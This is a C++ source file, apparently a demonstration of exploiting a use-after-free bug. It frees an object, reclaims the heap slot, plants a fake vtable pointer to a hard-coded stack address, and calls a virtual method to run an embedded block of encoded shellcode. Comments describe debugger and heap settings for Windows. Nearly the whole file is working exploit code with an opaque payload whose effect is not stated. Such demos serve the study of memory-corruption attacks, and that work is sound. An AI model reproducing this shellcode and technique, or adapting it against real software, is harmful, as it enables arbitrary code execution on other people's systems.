// useAfterFreeDemo.cpp : Defines the entry point for the console application.
//
// The debug heap works differently to the release heap, which again works differently from the debug crt heap
// so execution may work different in release/debug builds and with a debugger attached.
// The workaround is to attach to process, use the _NO_DEBUG_HEAP environment variable (or -hd flag?)
//C:\Documents and Settings\IEUser>set _NO_DEBUG_HEAP=1
//C:\Documents and Settings\IEUser>"c:\Program Files\Debugging Tools for Windows (x86)\windbg.exe"

//This version will only work in Release mode when run under a VS debugger
#include "stdafx.h"
#include <iostream>
#include <Windows.h>
using namespace std;

class C{
public:
	C():x(0x99),y(0x12){};
	virtual void func1()
	{
		cout<<"func1"<<endl;
	}
	virtual ~C(){}
private:
	int x;
	int y;
};

int _tmain(int argc, _TCHAR* argv[])
{
	//allocate buf on the stack
	unsigned char buf[] = "\x8c\xfe\x12\x00"	//fake vtable - points to shellcode
	"\xdd\xc1\xba\xe2\x20\xb5\x80\xd9\x74\x24\xf4\x5b\x33\xc9\xb1"
	"\x33\x31\x53\x17\x03\x53\x17\x83\x09\xdc\x57\x75\x31\xf5\x11"
	"\x76\xc9\x06\x42\xfe\x2c\x37\x50\x64\x25\x6a\x64\xee\x6b\x87"
	"\x0f\xa2\x9f\x1c\x7d\x6b\x90\x95\xc8\x4d\x9f\x26\xfd\x51\x73"
	"\xe4\x9f\x2d\x89\x39\x40\x0f\x42\x4c\x81\x48\xbe\xbf\xd3\x01"
	"\xb5\x12\xc4\x26\x8b\xae\xe5\xe8\x80\x8f\x9d\x8d\x56\x7b\x14"
	"\x8f\x86\xd4\x23\xc7\x3e\x5e\x6b\xf8\x3f\xb3\x6f\xc4\x76\xb8"
	"\x44\xbe\x89\x68\x95\x3f\xb8\x54\x7a\x7e\x75\x59\x82\x46\xb1"
	"\x82\xf1\xbc\xc2\x3f\x02\x07\xb9\x9b\x87\x9a\x19\x6f\x3f\x7f"
	"\x98\xbc\xa6\xf4\x96\x09\xac\x53\xba\x8c\x61\xe8\xc6\x05\x84"
	"\x3f\x4f\x5d\xa3\x9b\x14\x05\xca\xba\xf0\xe8\xf3\xdd\x5c\x54"
	"\x56\x95\x4e\x81\xe0\xf4\x04\x54\x60\x83\x61\x56\x7a\x8c\xc1"
	"\x3f\x4b\x07\x8e\x38\x54\xc2\xeb\xb7\x1e\x4f\x5d\x50\xc7\x05"
	"\xdc\x3d\xf8\xf3\x22\x38\x7b\xf6\xda\xbf\x63\x73\xdf\x84\x23"
	"\x6f\xad\x95\xc1\x8f\x02\x95\xc3\xf3\xc5\x05\x8f\xdd\x60\xae"
	"\x2a\x22";

	C *sampleObject = new C;
	cout<<"Object address:"<<(int*)sampleObject<<endl;

	sampleObject->func1();

	free(sampleObject);

	char *str = (char*)malloc(sizeof(char)*10);	//Get a heap allocation in the correct place

	cout<<"Str address: "<<(int*)str<<endl;

	*(int*)str = 0x0012FE88;	//address of continuous memory location we control

	cout<<"Shell code at: "<<(int*)buf<<endl;
	sampleObject->func1();			//execute it
	return 0;
}